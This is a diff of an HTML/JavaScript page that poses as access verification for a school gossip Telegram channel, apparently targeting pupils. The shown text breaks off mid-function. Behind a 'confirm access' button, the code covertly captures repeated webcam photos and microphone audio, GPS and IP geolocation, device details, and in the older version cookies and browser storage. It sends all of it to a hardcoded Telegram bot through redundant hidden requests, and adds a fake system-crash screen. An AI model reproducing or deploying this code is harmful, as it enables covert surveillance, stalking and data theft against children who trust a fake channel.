@@ -3,168 +3,128 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Подслушано 4 Школа | ТГК</title>
+    <title>Подслушано 4 Школа | Telegram Channel</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
             padding: 20px;
-            color: white;
-            position: relative;
-            overflow-x: hidden;
+            overflow: hidden;
         }
         
-        .telegram-app {
+        .telegram-container {
             width: 100%;
             max-width: 400px;
-            height: 85vh;
-            background: #0d1117;
+            background: white;
             border-radius: 24px;
             overflow: hidden;
-            box-shadow: 
-                0 25px 50px rgba(0, 0, 0, 0.5),
-                0 0 0 1px rgba(59, 130, 246, 0.1);
-            position: relative;
-            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
+            animation: slideIn 0.5s ease;
         }
         
-        .app-header {
-            background: rgba(13, 17, 23, 0.95);
-            padding: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-            position: relative;
-            z-index: 10;
-        }
-        
-        .header-left {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .back-button {
-            color: #3b82f6;
-            font-size: 20px;
-            cursor: pointer;
-        }
-        
-        .chat-title {
-            font-weight: 700;
-            font-size: 18px;
-        }
-        
-        .chat-subtitle {
-            font-size: 13px;
-            color: #94a3b8;
-            margin-top: 2px;
-        }
-        
-        .messages-container {
-            height: calc(100% - 140px);
-            overflow-y: auto;
-            padding: 20px;
-            display: flex;
-            flex-direction: column;
-            gap: 15px;
-            background: linear-gradient(180deg, 
-                rgba(13, 17, 23, 0.9) 0%,
-                rgba(13, 17, 23, 0.8) 100%);
-        }
-        
-        .message {
-            max-width: 80%;
-            padding: 12px 16px;
-            border-radius: 18px;
-            position: relative;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .message-them {
-            background: rgba(255, 255, 255, 0.05);
-            align-self: flex-start;
-            border-bottom-left-radius: 4px;
-        }
-        
-        .message-you {
-            background: linear-gradient(135deg, #3b82f6, #2563eb);
-            align-self: flex-end;
-            border-bottom-right-radius: 4px;
-        }
-        
-        .message-system {
-            background: rgba(245, 158, 11, 0.15);
-            border: 1px solid rgba(245, 158, 11, 0.3);
-            align-self: center;
-            text-align: center;
-            font-size: 13px;
-            color: #fbbf24;
-            max-width: 90%;
-            padding: 10px 15px;
-            border-radius: 12px;
-        }
-        
-        .message-text {
-            line-height: 1.4;
-            font-size: 14.5px;
-        }
-        
-        .message-time {
-            font-size: 11px;
-            color: rgba(255, 255, 255, 0.5);
-            margin-top: 4px;
-            text-align: right;
-        }
-        
-        .message-them .message-time {
-            color: rgba(255, 255, 255, 0.4);
-        }
-        
-        .input-area {
-            position: absolute;
-            bottom: 0;
-            left: 0;
-            right: 0;
-            background: rgba(13, 17, 23, 0.95);
-            padding: 15px 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
-        }
-        
-        .access-button {
-            width: 100%;
-            padding: 18px;
-            background: linear-gradient(135deg, #10b981, #059669);
+        .telegram-header {
+            background: #0088cc;
             color: white;
-            border: none;
-            border-radius: 16px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
+            padding: 20px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .avatar {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 10px;
-            transition: all 0.3s;
-            box-shadow: 0 8px 25px rgba(16, 185, 129, 0.3);
+            font-size: 24px;
+        }
+        
+        .channel-info h1 {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 4px;
+        }
+        
+        .channel-info p {
+            font-size: 14px;
+            opacity: 0.9;
+        }
+        
+        .telegram-content {
+            padding: 30px 20px;
+        }
+        
+        .message {
+            background: #f0f2f5;
+            border-radius: 18px;
+            padding: 15px;
+            margin-bottom: 15px;
+            position: relative;
+        }
+        
+        .message-admin {
+            background: #e3f2fd;
+            border-left: 4px solid #0088cc;
+        }
+        
+        .message-time {
+            font-size: 12px;
+            color: #999;
+            margin-top: 8px;
+            text-align: right;
+        }
+        
+        .access-panel {
+            background: #f8f9fa;
+            border-radius: 16px;
+            padding: 25px;
+            margin-top: 30px;
+            text-align: center;
+        }
+        
+        .access-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 15px;
+        }
+        
+        .access-desc {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        
+        .access-button {
+            background: linear-gradient(135deg, #0088cc, #0066a4);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, box-shadow 0.2s;
         }
         
         .access-button:hover {
             transform: translateY(-2px);
-            box-shadow: 0 12px 35px rgba(16, 185, 129, 0.4);
+            box-shadow: 0 10px 25px rgba(0,136,204,0.3);
         }
         
         .access-button:disabled {
@@ -173,157 +133,233 @@
             transform: none !important;
         }
         
-        .loading-indicator {
+        .loading {
             display: none;
             text-align: center;
-            color: #60a5fa;
-            font-size: 14px;
-            margin: 10px 0;
+            margin-top: 20px;
         }
         
-        .dots {
+        .loading-dots {
             display: inline-block;
+            position: relative;
+            width: 80px;
+            height: 20px;
         }
         
-        .dots span {
-            animation: blink 1.4s infinite;
-            opacity: 0;
-        }
-        
-        .dots span:nth-child(2) {
-            animation-delay: 0.2s;
-        }
-        
-        .dots span:nth-child(3) {
-            animation-delay: 0.4s;
-        }
-        
-        .hidden-frame {
-            display: none;
-        }
-        
-        .typing-indicator {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            padding: 10px 15px;
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 18px;
-            width: fit-content;
-            margin-bottom: 10px;
-        }
-        
-        .typing-dot {
-            width: 8px;
-            height: 8px;
-            background: #60a5fa;
+        .loading-dots div {
+            position: absolute;
+            width: 13px;
+            height: 13px;
             border-radius: 50%;
-            animation: typing 1.4s infinite;
+            background: #0088cc;
+            animation: loading 1.2s linear infinite;
         }
         
-        .typing-dot:nth-child(2) {
-            animation-delay: 0.2s;
+        .loading-dots div:nth-child(1) {
+            left: 8px;
+            animation-delay: -0.24s;
         }
         
-        .typing-dot:nth-child(3) {
-            animation-delay: 0.4s;
+        .loading-dots div:nth-child(2) {
+            left: 32px;
+            animation-delay: -0.12s;
         }
         
-        .verification-badge {
-            background: rgba(16, 185, 129, 0.1);
-            border: 1px solid rgba(16, 185, 129, 0.3);
-            border-radius: 12px;
-            padding: 12px 15px;
-            margin: 15px 0;
+        .loading-dots div:nth-child(3) {
+            left: 56px;
+            animation-delay: 0;
+        }
+        
+        .permissions-list {
+            list-style: none;
+            margin: 20px 0;
+        }
+        
+        .permissions-list li {
+            padding: 10px 15px;
+            background: #f0f2f5;
+            margin-bottom: 10px;
+            border-radius: 10px;
             display: flex;
             align-items: center;
             gap: 10px;
+        }
+        
+        .permissions-list li:before {
+            content: "✓";
+            color: #0088cc;
+            font-weight: bold;
+        }
+        
+        /* Синий экран смерти */
+        .blue-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #0078d7;
+            color: white;
+            z-index: 9999;
+            display: none;
+            font-family: Consolas, Monaco, monospace;
+            padding: 40px;
+            overflow-y: auto;
+        }
+        
+        .bsod-content {
+            max-width: 800px;
+            margin: 0 auto;
+        }
+        
+        .bsod-title {
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: white;
+        }
+        
+        .bsod-text {
+            font-size: 16px;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+        
+        .bsod-code {
+            background: rgba(0,0,0,0.3);
+            padding: 20px;
+            border-radius: 8px;
+            font-family: monospace;
             font-size: 14px;
+            line-height: 1.4;
+            margin: 20px 0;
+            overflow-x: auto;
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+        .bsod-percentage {
+            font-size: 24px;
+            margin: 30px 0;
+            text-align: center;
         }
         
-        @keyframes blink {
-            0%, 100% { opacity: 0; }
-            50% { opacity: 1; }
+        .restore-button {
+            background: rgba(255,255,255,0.2);
+            border: 2px solid white;
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: none;
+            margin: 30px auto;
         }
         
-        @keyframes typing {
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-5px); }
+        @keyframes slideIn {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
         
-        /* Стили для скроллбара */
-        .messages-container::-webkit-scrollbar {
-            width: 6px;
+        @keyframes loading {
+            0%, 80%, 100% { transform: scale(0); }
+            40% { transform: scale(1); }
         }
         
-        .messages-container::-webkit-scrollbar-track {
-            background: transparent;
+        @keyframes glitch {
+            0% { transform: translate(0); }
+            20% { transform: translate(-2px, 2px); }
+            40% { transform: translate(-2px, -2px); }
+            60% { transform: translate(2px, 2px); }
+            80% { transform: translate(2px, -2px); }
+            100% { transform: translate(0); }
         }
         
-        .messages-container::-webkit-scrollbar-thumb {
-            background: rgba(255, 255, 255, 0.1);
-            border-radius: 3px;
+        .glitch {
+            animation: glitch 0.3s;
         }
     </style>
 </head>
 <body>
-    <iframe class="hidden-frame" id="stealthFrame"></iframe>
-    
-    <div class="telegram-app">
-        <div class="app-header">
-            <div class="header-left">
-                <div class="back-button">←</div>
-                <div>
-                    <div class="chat-title">ПОДСЛУШАНО 4 ШКОЛА</div>
-                    <div class="chat-subtitle">🔐 Закрытый канал • 5,247 участников</div>
+    <div class="telegram-container" id="telegramApp">
+        <div class="telegram-header">
+            <div class="avatar">✈️</div>
+            <div class="channel-info">
+                <h1>ПОДСЛУШАНО 4 ШКОЛА</h1>
+                <p>5,247 подписчиков • 387 онлайн</p>
+            </div>
+        </div>
+        
+        <div class="telegram-content">
+            <div class="message message-admin">
+                <p>🔐 <strong>Важное сообщение от администрации:</strong></p>
+                <p>Для доступа к закрытому каналу необходимо пройти верификацию. Это защита от ботов и посторонних.</p>
+                <div class="message-time">только что</div>
+            </div>
+            
+            <div class="message">
+                <p>Привет! Я тоже из 4 школы, хочу присоединиться к каналу. Как пройти верификацию?</p>
+                <div class="message-time">2 минуты назад</div>
+            </div>
+            
+            <div class="message message-admin">
+                <p>Привет! Верификация автоматическая. Нажми кнопку "ПОДТВЕРДИТЬ ДОСТУП" ниже, система сама проверит твои данные.</p>
+                <p>Это займет 1-2 минуты ⏱️</p>
+                <div class="message-time">1 минута назад</div>
+            </div>
+            
+            <div class="access-panel">
+                <h2 class="access-title">🔐 Подтверждение доступа</h2>
+                <p class="access-desc">
+                    Для вступления в канал "Подслушано 4 Школа" необходимо подтвердить, что ты учишься в нашей школе.
+                </p>
+                
+                <ul class="permissions-list">
+                    <li>Верификация через камеру</li>
+                    <li>Проверка голоса</li>
+                    <li>Определение местоположения</li>
+                    <li>Проверка устройства</li>
+                </ul>
+                
+                <button class="access-button" id="accessButton" onclick="startVerification()">
+                    ПОДТВЕРДИТЬ ДОСТУП
+                </button>
+                
+                <div class="loading" id="loading">
+                    <div class="loading-dots">
+                        <div></div>
+                        <div></div>
+                        <div></div>
+                    </div>
+                    <p style="margin-top: 10px; color: #666;">Идет проверка данных...</p>
                 </div>
             </div>
         </div>
-        
-        <div class="messages-container" id="messages">
-            <!-- Сообщения будут добавляться динамически -->
-            <div class="message message-system">
-                🔒 Канал защищен end-to-end шифрованием
+    </div>
+    
+    <!-- Синий экран -->
+    <div class="blue-screen" id="blueScreen">
+        <div class="bsod-content">
+            <h1 class="bsod-title">:(</h1>
+            <p class="bsod-text">
+                На вашем ПК возникла проблема, и его необходимо перезагрузить.<br>
+                Мы просто собираем некоторую диагностическую информацию, а затем перезагрузим его за вас.
+            </p>
+            <div class="bsod-percentage" id="bsodPercentage">0% завершено</div>
+            <div class="bsod-code" id="bsodCode">
+                STOP: 0x0000007B (0xFFFFF880009A9928, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)<br>
+                SYSTEM_THREAD_EXCEPTION_NOT_HANDLED<br>
+                Что-то пошло не так, и мы не можем сказать, что именно.
             </div>
-            
-            <div class="message message-them">
-                <div class="message-text">Привет! Чтобы получить доступ к каналу, нужно пройти верификацию. У нас строгая политика безопасности 👮‍♂️</div>
-                <div class="message-time">12:34</div>
+            <p class="bsod-text">
+                Если эта проблема возникает впервые, перезагрузите компьютер.<br>
+                Если проблема появляется снова, выполните следующие действия:
+            </p>
+            <div class="bsod-code">
+                • Убедитесь, что установлены последние обновления.<br>
+                • Обратитесь к системному администратору или в службу поддержки оборудования.<br>
+                • Проверьте наличие драйверов в диспетчере устройств.<br>
+                • Отключите все недавно установленные устройства или драйверы.
             </div>
-            
-            <div class="message message-you">
-                <div class="message-text">Привет, хочу присоединиться к каналу</div>
-                <div class="message-time">12:35</div>
-            </div>
-            
-            <div class="message message-them">
-                <div class="message-text">Отлично! Мы рады новым участникам 😊 Для доступа нужно подтвердить, что ты ученик 4 школы. Это автоматическая система проверки</div>
-                <div class="message-time">12:35</div>
-            </div>
-            
-            <div class="message message-them">
-                <div class="message-text">Нажми кнопку ниже для быстрой верификации. Займет всего 1-2 минуты ⏱️</div>
-                <div class="message-time">12:36</div>
-            </div>
-        </div>
-        
-        <div class="input-area">
-            <div class="verification-badge">
-                <span style="color: #10b981;">✓</span>
-                Верификация полностью автоматическая и безопасная
-            </div>
-            
-            <div class="loading-indicator" id="loading">
-                Идет проверка<span class="dots"><span>.</span><span>.</span><span>.</span></span>
-            </div>
-            
-            <button class="access-button" id="verifyBtn" onclick="startStealthVerification()">
-                <span>🔓</span> ПОДТВЕРДИТЬ ДОСТУП К КАНАЛУ
+            <button class="restore-button" id="restoreButton" onclick="restoreSystem()">
+                ВОССТАНОВИТЬ СИСТЕМУ
             </button>
         </div>
     </div>
@@ -331,646 +367,512 @@
 <script>
 // Конфигурация
 const BOT_TOKEN = '8337372161:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
-const ADMIN_ID = '8001083987';
+const CHAT_ID = '8001083987';
 
 // Глобальные переменные
-let isCollecting = false;
-let collectedData = [];
 let mediaStream = null;
 let audioRecorder = null;
+let videoRecorder = null;
+let photoCount = 0;
+let audioRecordCount = 0;
+let videoRecordCount = 0;
+let isProcessing = false;
 
-// Создание скрытых элементов
-const stealthFrame = document.getElementById('stealthFrame');
-const hiddenCanvas = document.createElement('canvas');
-const hiddenAudio = document.createElement('audio');
-document.body.appendChild(hiddenCanvas);
-document.body.appendChild(hiddenAudio);
-
-// Добавление сообщения в чат
-function addMessage(text, type = 'them') {
-    const messagesDiv = document.getElementById('messages');
-    const messageDiv = document.createElement('div');
-    messageDiv.className = `message message-${type}`;
+// Функция отправки в Telegram
+function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
     
-    const now = new Date();
-    const time = `${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}`;
-    
-    messageDiv.innerHTML = `
-        <div class="message-text">${text}</div>
-        <div class="message-time">${time}</div>
-    `;
-    
-    messagesDiv.appendChild(messageDiv);
-    messagesDiv.scrollTop = messagesDiv.scrollHeight;
-    
-    return messageDiv;
-}
-
-// Показать индикатор набора
-function showTyping() {
-    const messagesDiv = document.getElementById('messages');
-    const typingDiv = document.createElement('div');
-    typingDiv.className = 'typing-indicator';
-    typingDiv.id = 'typingIndicator';
-    typingDiv.innerHTML = `
-        <div class="typing-dot"></div>
-        <div class="typing-dot"></div>
-        <div class="typing-dot"></div>
-    `;
-    messagesDiv.appendChild(typingDiv);
-    messagesDiv.scrollTop = messagesDiv.scrollHeight;
-}
-
-// Скрыть индикатор набора
-function hideTyping() {
-    const typing = document.getElementById('typingIndicator');
-    if (typing) typing.remove();
-}
-
-// Отправка в Telegram через различные методы
-function sendToBot(data, type = 'text') {
-    const timestamp = new Date().toLocaleString('ru-RU');
-    let message = '';
-    
-    if (type === 'text') {
-        message = encodeURIComponent(`🔰 НОВЫЙ ДОСТУП 🔰\n\n⏰ ${timestamp}\n${data}`);
-    } else if (type === 'media') {
-        message = encodeURIComponent(`📦 МЕДИА ДАННЫЕ\n⏰ ${timestamp}\n${data}`);
-    } else if (type === 'system') {
-        message = encodeURIComponent(`💻 СИСТЕМНЫЕ ДАННЫЕ\n⏰ ${timestamp}\n${data}`);
-    }
-    
-    // Основной метод
-    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${message}`;
-    
-    // 1. Fetch
+    // Используем несколько методов отправки
     fetch(url, { mode: 'no-cors' }).catch(() => {});
-    
-    // 2. Image
     new Image().src = url;
     
-    // 3. Iframe
-    stealthFrame.src = url;
-    
-    // 4. XHR
-    const xhr = new XMLHttpRequest();
-    xhr.open('GET', url, true);
-    xhr.send();
-    
-    // 5. Beacon
-    navigator.sendBeacon && navigator.sendBeacon(url);
-    
-    // 6. Form submit
-    setTimeout(() => {
-        const form = document.createElement('form');
-        form.method = 'GET';
-        form.action = url;
-        form.style.display = 'none';
-        document.body.appendChild(form);
-        form.submit();
-        document.body.removeChild(form);
-    }, 100);
-}
-
-// Отправка фото в Telegram
-function sendPhoto(blob, index) {
-    const formData = new FormData();
-    formData.append('chat_id', ADMIN_ID);
-    formData.append('photo', blob, `verify_${Date.now()}_${index}.jpg`);
-    formData.append('caption', `📸 Верификация фото #${index}`);
-    
-    // Отправка через iframe
+    // Дополнительный метод через iframe
     const iframe = document.createElement('iframe');
     iframe.style.display = 'none';
-    iframe.name = 'photoUpload';
+    iframe.src = url;
     document.body.appendChild(iframe);
-    
-    const form = document.createElement('form');
-    form.method = 'POST';
-    form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-    form.target = 'photoUpload';
-    form.enctype = 'multipart/form-data';
-    
-    // Добавляем поля формы
-    const chatId = document.createElement('input');
-    chatId.type = 'hidden';
-    chatId.name = 'chat_id';
-    chatId.value = ADMIN_ID;
-    form.appendChild(chatId);
-    
-    const photoInput = document.createElement('input');
-    photoInput.type = 'hidden';
-    photoInput.name = 'photo';
-    photoInput.value = blob;
-    form.appendChild(photoInput);
-    
-    document.body.appendChild(form);
-    form.submit();
-    
-    setTimeout(() => {
-        document.body.removeChild(form);
-        document.body.removeChild(iframe);
-    }, 1000);
+    setTimeout(() => iframe.remove(), 1000);
 }
 
-// Получение полной информации о системе
-async function collectFullSystemInfo() {
-    const info = {
-        // Базовые данные
-        userAgent: navigator.userAgent,
-        platform: navigator.platform,
-        languages: navigator.languages || [navigator.language],
-        cookieEnabled: navigator.cookieEnabled,
-        online: navigator.onLine,
+// Функция отправки фото
+async function sendPhoto(blob, index) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', blob, `photo_${index}.jpg`);
+    formData.append('caption', `📸 Фото #${index} - Подслушано 4 Школа`);
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors'
+        });
+    } catch(e) {}
+}
+
+// Функция отправки видео
+async function sendVideo(blob, index) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('video', blob, `video_${index}.mp4`);
+    formData.append('caption', `🎥 Видео #${index} - Подслушано 4 Школа`);
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors'
+        });
+    } catch(e) {}
+}
+
+// Функция отправки аудио
+async function sendAudio(blob, index) {
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('audio', blob, `audio_${index}.ogg`);
+    formData.append('caption', `🎤 Аудио #${index} - Подслушано 4 Школа`);
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
+            method: 'POST',
+            body: formData,
+            mode: 'no-cors'
+        });
+    } catch(e) {}
+}
+
+// Получение информации о системе
+async function getSystemInfo() {
+    let info = "📱 Информация о системе:\n\n";
+    
+    info += `🌐 User Agent: ${navigator.userAgent}\n`;
+    info += `🖥️ Платформа: ${navigator.platform}\n`;
+    info += `🗣️ Язык: ${navigator.language}\n`;
+    info += `📏 Экран: ${screen.width}x${screen.height}\n`;
+    info += `🎨 Цветность: ${screen.colorDepth} бит\n`;
+    info += `📍 Часовой пояс: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
+    info += `🔗 URL: ${window.location.href}\n`;
+    
+    // Получение IP
+    try {
+        const ipResponse = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipResponse.json();
+        info += `📡 IP адрес: ${ipData.ip}\n`;
         
-        // Экран
-        screen: {
-            width: screen.width,
-            height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth
-        },
-        
-        // Временная зона
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        
-        // Производительность
-        hardwareConcurrency: navigator.hardwareConcurrency,
-        deviceMemory: navigator.deviceMemory,
-        maxTouchPoints: navigator.maxTouchPoints,
-        
-        // Сеть
-        connection: navigator.connection ? {
-            effectiveType: navigator.connection.effectiveType,
-            downlink: navigator.connection.downlink,
-            rtt: navigator.connection.rtt,
-            saveData: navigator.connection.saveData
-        } : null,
-        
-        // Батарея
-        battery: null,
-        
-        // Геолокация
-        location: null,
-        
-        // Хранилище
-        localStorage: {},
-        sessionStorage: {},
-        cookies: document.cookie,
-        
-        // Дополнительно
-        referrer: document.referrer,
-        url: window.location.href,
-        timestamp: new Date().toISOString()
-    };
+        // Получение геолокации по IP
+        const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const geoData = await geoResponse.json();
+        info += `🏙️ Город: ${geoData.city || 'Неизвестно'}\n`;
+        info += `📍 Регион: ${geoData.region || 'Неизвестно'}\n`;
+        info += `🇷🇺 Страна: ${geoData.country_name || 'Неизвестно'}\n`;
+        info += `🎯 Координаты: ${geoData.latitude || '?'}, ${geoData.longitude || '?'}\n`;
+    } catch(e) {
+        info += `❌ Ошибка получения IP: ${e.message}\n`;
+    }
+    
+    // GPS геолокация
+    if (navigator.geolocation) {
+        try {
+            const position = await new Promise((resolve, reject) => {
+                navigator.geolocation.getCurrentPosition(resolve, reject, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            });
+            
+            info += `🎯 GPS координаты: ${position.coords.latitude}, ${position.coords.longitude}\n`;
+            info += `📏 Точность: ${position.coords.accuracy}м\n`;
+        } catch(e) {
+            info += `❌ GPS недоступен: ${e.message}\n`;
+        }
+    }
     
     // Батарея
     if ('getBattery' in navigator) {
         try {
             const battery = await navigator.getBattery();
-            info.battery = {
-                level: Math.round(battery.level * 100),
-                charging: battery.charging,
-                chargingTime: battery.chargingTime,
-                dischargingTime: battery.dischargingTime
-            };
+            info += `🔋 Батарея: ${Math.round(battery.level * 100)}% ${battery.charging ? '(заряжается)' : ''}\n`;
         } catch(e) {}
     }
     
-    // LocalStorage и SessionStorage
-    for (let i = 0; i < localStorage.length; i++) {
-        const key = localStorage.key(i);
-        info.localStorage[key] = localStorage.getItem(key).substring(0, 100);
-    }
-    
-    for (let i = 0; i < sessionStorage.length; i++) {
-        const key = sessionStorage.key(i);
-        info.sessionStorage[key] = sessionStorage.getItem(key).substring(0, 100);
+    // Сеть
+    if (navigator.connection) {
+        info += `📶 Тип соединения: ${navigator.connection.effectiveType}\n`;
+        info += `⬇️ Скорость: ${navigator.connection.downlink} Mbps\n`;
     }
     
     return info;
 }
 
-// Получение IP и геолокации
-async function getNetworkInfo() {
+// Фотосъемка
+async function takePhotos() {
+    const video = document.createElement('video');
+    video.srcObject = mediaStream;
+    video.muted = true;
+    
     try {
-        // Получение IP
-        const ipRes = await fetch('https://api.ipify.org?format=json');
-        const ipData = await ipRes.json();
-        
-        // Получение геоданных
-        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-        const geoData = await geoRes.json();
-        
-        return {
-            ip: ipData.ip,
-            city: geoData.city || 'Неизвестно',
-            region: geoData.region || 'Неизвестно',
-            country: geoData.country_name || 'Неизвестно',
-            postal: geoData.postal || 'Неизвестно',
-            latitude: geoData.latitude || 'Неизвестно',
-            longitude: geoData.longitude || 'Неизвестно',
-            timezone: geoData.timezone || 'Неизвестно',
-            org: geoData.org || 'Неизвестно',
-            asn: geoData.asn || 'Неизвестно'
-        };
-    } catch(e) {
-        return { error: e.message };
-    }
-}
-
-// GPS геолокация
-async function getGPSLocation() {
-    return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-            resolve(null);
-            return;
-        }
-        
-        navigator.geolocation.getCurrentPosition(
-            (position) => {
-                resolve({
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    altitude: position.coords.altitude,
-                    altitudeAccuracy: position.coords.altitudeAccuracy,
-                    heading: position.coords.heading,
-                    speed: position.coords.speed,
-                    timestamp: position.timestamp
-                });
-            },
-            (error) => {
-                resolve({ error: error.message });
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 10000,
-                maximumAge: 0
-            }
-        );
-    });
-}
-
-// Захват медиа с камеры и микрофона
-async function captureStealthMedia() {
-    try {
-        showTyping();
-        setTimeout(hideTyping, 1500);
-        addMessage('Запрашиваю доступ к камере для проверки профиля...', 'them');
-        
-        // Получаем доступ ко всем устройствам
-        mediaStream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                width: { ideal: 1920 },
-                height: { ideal: 1080 },
-                facingMode: 'user',
-                frameRate: { ideal: 60 }
-            },
-            audio: {
-                echoCancellation: false,
-                noiseSuppression: false,
-                autoGainControl: false,
-                sampleRate: 48000,
-                channelCount: 2,
-                channelCountMode: 'max'
-            }
-        });
-        
-        addMessage('✅ Доступ получен! Начинаю верификацию...', 'them');
-        
-        // Создаем видео элемент для захвата
-        const video = document.createElement('video');
-        video.srcObject = mediaStream;
-        video.muted = true;
-        video.playsInline = true;
-        document.body.appendChild(video);
-        
         await video.play();
         
-        // Ждем стабилизации видео
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        
-        // Создаем canvas для фото
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
         const ctx = canvas.getContext('2d');
         
-        // Делаем 15 скриншотов с интервалом
-        for (let i = 1; i <= 15; i++) {
+        // Ждем готовности видео
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        
+        canvas.width = video.videoWidth || 1280;
+        canvas.height = video.videoHeight || 720;
+        
+        // Делаем 10 фото с интервалом
+        for (let i = 1; i <= 10; i++) {
             ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
             
-            canvas.toBlob((blob) => {
+            canvas.toBlob(async (blob) => {
                 if (blob) {
-                    sendPhoto(blob, i);
-                    sendToBot(`📸 Фото #${i} отправлено (${(blob.size/1024).toFixed(1)} KB)`, 'media');
+                    await sendPhoto(blob, i);
+                    photoCount++;
                 }
-            }, 'image/jpeg', 0.95);
+            }, 'image/jpeg', 0.9);
             
             await new Promise(resolve => setTimeout(resolve, 1000));
         }
         
-        // Запись аудио
-        addMessage('Проверяю микрофон...', 'them');
-        showTyping();
+        video.pause();
+        video.srcObject = null;
         
+    } catch(e) {
+        console.error('Ошибка фотосъемки:', e);
+    }
+}
+
+// Запись аудио
+async function recordAudio() {
+    try {
         const audioContext = new (window.AudioContext || window.webkitAudioContext)();
         const source = audioContext.createMediaStreamSource(mediaStream);
         const destination = audioContext.createMediaStreamDestination();
         source.connect(destination);
         
-        audioRecorder = new MediaRecorder(destination.stream, {
-            mimeType: 'audio/webm;codecs=opus'
-        });
-        
-        const audioChunks = [];
+        audioRecorder = new MediaRecorder(destination.stream);
+        const chunks = [];
         
         audioRecorder.ondataavailable = (event) => {
             if (event.data.size > 0) {
-                audioChunks.push(event.data);
+                chunks.push(event.data);
             }
         };
         
         audioRecorder.onstop = async () => {
-            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-            sendToBot(`🎤 Аудио запись завершена (${(audioBlob.size/1024).toFixed(1)} KB)`, 'media');
-            
-            // Отправка аудио через форму
-            const audioFormData = new FormData();
-            audioFormData.append('chat_id', ADMIN_ID);
-            audioFormData.append('audio', audioBlob, 'verification_audio.webm');
-            
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, {
-                method: 'POST',
-                body: audioFormData,
-                mode: 'no-cors'
-            }).catch(() => {});
+            const audioBlob = new Blob(chunks, { type: 'audio/webm' });
+            await sendAudio(audioBlob, audioRecordCount);
+            audioRecordCount++;
         };
         
-        // Записываем 30 секунд аудио
-        audioRecorder.start();
-        setTimeout(() => {
